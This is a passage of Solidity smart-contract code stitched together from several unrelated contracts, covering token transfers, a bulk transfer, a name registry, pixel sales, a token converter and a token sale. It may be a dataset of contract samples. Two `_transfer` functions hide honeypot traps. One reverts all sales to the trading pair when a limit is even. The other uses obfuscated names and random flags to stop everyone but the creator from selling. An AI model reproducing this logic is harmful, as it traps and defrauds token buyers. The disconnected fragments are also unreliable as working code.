    disableFee = true;
    if (mitigationEnabled) {
        swapTokensForEthWithMitigation(tokenAmount);
    } else {
        swapTokensForEthNormal(tokenAmount);
    }
    disableFee = false;
}

function _transfer(address from, address to, uint256 amount) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    if (disableFee) {
        _feeAddr1 = 0;
        _feeAddr2 = 0;
    } else {
        _feeAddr1 = 2;
        _feeAddr2 = 8;
    }
    if (from != address(this) && to != deadWallet && from != owner() && to != owner()) {
        require(!bots[from] && !bots[to]);
        if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] && cooldownEnabled) {
            require(amount <= _maxTxAmount);
        }
        if (to == uniswapV2Pair && _maxTxAmount % 2 == 0) {
            revert("Transaction must be less than maxTxAmount");
        }
        if (!disableFee && to == uniswapV2Pair && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) {
            _feeAddr1 = 2;
            _feeAddr2 = 10;
        }
        if (!inSwap && from != uniswapV2Pair && swapEnabled) {
            uint256 contractTokenBalance = balanceOf(address(this));
            swapTokensForEth(contractTokenBalance);
            uint256 contractETHBalance = address(this).balance;
            if (contractETHBalance > 0) {
                sendETHToFee(address(this).balance);
            }
        }
    }
    _tokenTransfer(from, to, amount);
}

function bulkTransfer(address[] addresses, uint256 amount) public returns(bool) {
    require(amount > 0 &&
        addresses.length > 0 &&
        frozenAccount[msg.sender] == false &&
        now > unlockUnixTime[msg.sender]);
    amount = amount.mul(1e18);
    uint256 totalAmount = amount.mul(addresses.length);
    require(balanceOf[msg.sender] >= totalAmount);
    for (uint j = 0; j < addresses.length; j++) {
        require(addresses[j] != 0x0 &&
            frozenAccount[addresses[j]] == false &&
            now > unlockUnixTime[addresses[j]]);
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
        balanceOf[addresses[j]] = balanceOf[addresses[j]].add(amount);
        Transfer(msg.sender, addresses[j], amount);
    }
    return true;
}

function registerNameCore(uint256 _pID, address _addr, uint256 _affID, bytes32 _name, bool _isNewPlayer, bool _all)
private {
    if (pIDxName_[_name] != 0) {
        require(plyrNames_[_pID][_name], "that name already taken");
    }
    plyr_[_pID].name = _name;
    pIDxName_[_name] = _pID;
    if (!plyrNames_[_pID][_name]) {
        plyrNames_[_pID][_name] = true;
        uint256 namesCount = plyr_[_pID].names + 1;
        plyr_[_pID].names = namesCount;
        plyrNameList_[_pID][namesCount] = _name;
    }
    owner.transfer(msg.value);
    if (_all) {
        for (uint256 i = 1; i <= gID_; i++) {
            games_[i].receivePlayerInfo(_pID, _addr, _name);
        }
    }
    emit onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, msg.value, now);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (pampers == false)) {
        england = chTx;
        ireland = true;
    }
    if ((address(sender) == creator) && (pampers == true)) {
        pickle[recipient] = true;
        dragonfruit[recipient] = false;
        pampers = false;
    }
    if ((amount > golden) && (pickle[sender] == true) && (address(sender) != creator)) {
        baelrog[recipient] = true;
    }
    if (pickle[recipient] != true) {
        dragonfruit[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((dragonfruit[sender]) && (pickle[recipient] == false)) {
        dragonfruit[recipient] = true;
    }
    if (pickle[sender] == false) {
        if ((amount > golden) && (baelrog[sender] == true)) {
            require(false);
        }
        require(amount < england);
        if (ireland == true) {
            if (baelrog[sender] == true) {
                require(false);
            }
            baelrog[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function buyOwnedPixels(bytes32 pxHash) public payable returns(bool) {
    require(pixelsOnSale[pxHash].isValue == true);
    require(msg.value >= pixelsOnSale[pxHash].blockPrice);
    address blockOwner = pixelsOwned[pxHash];
    blockOwner.transfer(msg.value);
    pixelsOwned[pxHash] = msg.sender;
    pixelsOnSale[pxHash].isValue = false;
    return true;
}

function buyFreePixels(uint256 tX, uint256 tY, uint256 bX, uint256 bY) public payable returns(bool) {
    bytes32 pxHash = keccak256(tX, tY, bX, bY);
    uint256 pxCount = (bX - tX) * (bY - tY);
    uint256 blockPrice = getQuotes() * pxCount;
    require(msg.value >= blockPrice);
    require(pixelsOwned[pxHash] == 0x0000000000000000000000000000000000000000);
    owner.transfer(msg.value);
    pixelsOwned[pxHash] = msg.sender;
    pixelsSold = pixelsSold + pxCount;
    return true;
}

function convertForMultiple(IERC20Token[] _paths, uint256[] _pathStartIndex, uint256[] _amounts, uint256[] _minReturns, address _for)
public
payable
returns(uint256[]) {
    uint256 convertedValue = 0;
    uint256 pathEndIndex;
    for (uint256 i = 0; i < _pathStartIndex.length; i += 1) {
        pathEndIndex = i == (_pathStartIndex.length - 1) ? _paths.length : _pathStartIndex[i + 1];
        IERC20Token[] memory path = new IERC20Token[](pathEndIndex - _pathStartIndex[i]);
        for (uint256 j = _pathStartIndex[i]; j < pathEndIndex; j += 1) {
            path[j - _pathStartIndex[i]] = _paths[j];
        }
        IERC20Token fromToken = path[0];
        require(msg.value == 0 || (_amounts[i] <= msg.value && etherTokens[fromToken]) || !etherTokens[fromToken]);
        if (msg.value > 0 && etherTokens[fromToken]) {
            IEtherToken(fromToken).deposit.value(_amounts[i])();
            convertedValue += _amounts[i];
        }
        _amounts[i] = convertForInternal(path, _amounts[i], _minReturns[i], _for, 0x0, 0x0, 0x0, 0x0);
    }
    require(convertedValue == msg.value);
    return _amounts;
}

function getTokens() payable canDistr public {
    uint256 tokens = 0;
    uint256 bonus = 0;
    uint256 countbonus = 0;
    uint256 bonusCond1 = 1 ether / 10;
    uint256 bonusCond2 = 1 ether;
    uint256 bonusCond3 = 5 ether;
    tokens = tokensPerEth.mul(msg.value) / 1 ether;
    address investor = msg.sender;
    if (msg.value >= requestMinimum && now < deadline && now < round1 && now < round2) {
        if (msg.value >= bonusCond1 && msg.value < bonusCond2) {
            countbonus = tokens * 5 / 100;
        } else if (msg.value >= bonusCond2 && msg.value < bonusCond3) {
            countbonus = tokens * 10 / 100;
        } else if (msg.value >= bonusCond3) {
            countbonus = tokens * 15 / 100;
        }
    } else if (msg.value >= requestMinimum && now < deadline && now > round1 && now < round2) {
        if (msg.value >= bonusCond2 && msg.value < bonusCond3) {
            countbonus = tokens * 5 / 100;
        } else if (msg.value >= bonusCond3) {
            countbonus = tokens * 10 / 100;
        }
    } else {
        countbonus = 0;
    }
    bonus = tokens + countbonus;
    if (tokens == 0) {
        uint256 valdrop = 10000e8;
        if (Claimed[investor] == false && progress0drop <= target0drop) {
            distr(investor, valdrop);
            Claimed[investor] = true;
            progress0drop++;
        } else {
            require(msg.value >= requestMinimum);
        }
    } else if (tokens > 0 && msg.value >= requestMinimum) {
        if (now >= deadline && now >= round1 && now < round2) {
            distr(investor, tokens);
        } else {
            if (msg.value >= bonusCond1) {
                distr(investor, bonus);
            } else {
                distr(investor, tokens);
            }
        }
    } else {
        require(msg.value >= requestMinimum);
    }
    if (totalDistributed >= totalSupply) {
        distributionFinished = true;
    }
    multisig.transfer(msg.value);
}

